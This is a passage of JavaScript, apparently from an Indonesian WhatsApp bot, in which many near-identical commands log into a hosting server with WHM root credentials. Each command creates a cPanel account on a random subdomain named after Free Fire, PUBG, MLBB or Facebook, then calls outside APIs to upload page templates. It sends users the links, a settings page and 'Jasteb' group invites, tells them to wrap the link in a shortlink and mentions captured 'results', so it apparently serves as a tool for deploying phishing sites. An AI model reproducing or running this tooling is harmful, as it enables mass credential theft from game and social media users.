➢ Grub Jasteb GG¹ :
https://chat.whatsapp.com/HvC8kvi2argANFrfCnpNPH
==========================
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan
==========================`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner Ku Untuk Sewa")
        }
break
// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB
case 'webp5' :

id = msg.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "freefireI" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("_*PROSES DECK JEDA 2-3 MENIT*_")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://apiinew.newnesia.biz.id/web/ff/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://apiinew.newnesia.biz.id/web/ff/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
==========================
➢ Grub Jasteb GG¹ :
https://chat.whatsapp.com/HvC8kvi2argANFrfCnpNPH
==========================
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan
==========================`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner Ku Untuk Sewa")
        }
break
// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB
case 'webp6' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "freefire2" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("_*PROSES DECK JEDA 2-3 MENIT*_")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://apiinew.newnesia.biz.id/web/ff2/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://apiinew.newnesia.biz.id/web/ff2/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
==========================
➢ Grub Jasteb GG¹ :
https://chat.whatsapp.com/HvC8kvi2argANFrfCnpNPH
==========================
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan
==========================`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner Ku Untuk Sewa")
        }
break
// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB
case 'webp7' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "pubgm12" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("_*PROSES DECK JEDA 2-3 MENIT*_")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://apiinew.newnesia.biz.id/web/bg/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://apiinew.newnesia.biz.id/web/bg/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
==========================
➢ Grub Jasteb GG¹ :
https://chat.whatsapp.com/HvC8kvi2argANFrfCnpNPH
==========================
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan
==========================`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner Ku Untuk Sewa")
        }
break

// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB
case 'webp8' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "mlbb" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("_*PROSES DECK JEDA 2-3 MENIT*_")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://apiinew.newnesia.biz.id/web/ml/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://apiinew.newnesia.biz.id/web/ml/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
==========================
➢ Grub Jasteb GG¹ :
https://chat.whatsapp.com/HvC8kvi2argANFrfCnpNPH
==========================
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan
==========================`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner Ku Untuk Sewa")
        }
break

// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB
case 'webp9' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "simontok" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("*_PROSES DECK JEDA 2-3 MENIT_*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://apiinew.newnesia.biz.id/web/tok/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://apiinew.newnesia.biz.id/web/tok/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
==========================
➢ Grub Jasteb GG¹ :
https://chat.whatsapp.com/HvC8kvi2argANFrfCnpNPH
==========================
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan
==========================`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner Ku Untuk Sewa")
        }
break
case 'we0' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "fb" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("*_PROSES DECK JEDA 2-3 MENIT_*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://apiii-newbotwebp.newnesia.biz.id/web/fb/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://apiii-newbotwebp.newnesia.biz.id/web/fb/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
==========================
➢ Grub Jasteb GG :
https://chat.whatsapp.com/HvC8kvi2argANFrfCnpNPH
==========================
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan
==========================`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner Ku Untuk Sewa")
        }
break
// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB
case 'dim11' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "simontok" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("*_Sabar Om,Ga Lama Kok🤤_*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api.qris-ku.biz.id/domain/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://api.qris-ku.biz.id/grupv5/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*🤤
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
*Sebelum Di Gunakan Bungkus Dulu Dengan Cara Ketik .shortlink*
➢ Grub Jasteb GG¹ :
https://chat.whatsapp.com/Gyku8sYY57I7JHrk6tpxJf
➢ Grub Jasteb GG² :
https://chat.whatsapp.com/CNGkBWYcKtvCM9i7eCTDYj
*➢ Ress Ga Masuk? Tonton!*
https://youtu.be/nQRaulTXTxA
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner Ku Untuk Sewa")
        }
break
// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB
case 'dim12' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "simontok" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("*_Sabar Om,Ga Lama Kok🤤_*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api.qris-ku.biz.id/domain/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://api.qris-ku.biz.id/grubv6/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply("*Silahkan Cek Pesan Ku Om*")
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*🤤
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
*Sebelum Di Gunakan Bungkus Dulu Dengan Cara Ketik .shortlink*
➢ Grub Jasteb GG¹ :
https://chat.whatsapp.com/Gyku8sYY57I7JHrk6tpxJf
➢ Grub Jasteb GG² :
https://chat.whatsapp.com/CNGkBWYcKtvCM9i7eCTDYj
*➢ Ress Ga Masuk? Tonton!*
https://youtu.be/nQRaulTXTxA
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner Ku")
        }
break
// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB
case 'dim13' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "simontok" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("*_Sabar Om,Ga Lama Kok🤤_*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api.qris-ku.biz.id/domain/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://api.qris-ku.biz.id/grubv7/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*🤤
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
*Sebelum Di Gunakan Bungkus Dulu Dengan Cara Ketik .shortlink*
➢ Grub Jasteb GG¹ :
https://chat.whatsapp.com/Gyku8sYY57I7JHrk6tpxJf
➢ Grub Jasteb GG² :
https://chat.whatsapp.com/CNGkBWYcKtvCM9i7eCTDYj
*➢ Ress Ga Masuk? Tonton!*
https://youtu.be/nQRaulTXTxA
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Ownerku")
        }
break
// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB
case 'dim14' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "simontok" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("*_Sabar Om,Ga Lama Kok🤤_*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api.qris-ku.biz.id/domain/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://api.qris-ku.biz.id/grubv8/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*🤤
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
*Sebelum Di Gunakan Bungkus Dulu Dengan Cara Ketik .shortlink*
➢ Grub Jasteb GG¹ :
https://chat.whatsapp.com/Gyku8sYY57I7JHrk6tpxJf
➢ Grub Jasteb GG² :
https://chat.whatsapp.com/CNGkBWYcKtvCM9i7eCTDYj
*➢ Ress Ga Masuk? Tonton!*
https://youtu.be/nQRaulTXTxA
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner Ku")
        }
break
// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB
case 'dim15' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "simontok" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("*_Sabar Om,Ga Lama Kok🤤_*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api.qris-ku.biz.id/domain/createcp.php',
            form: inputt
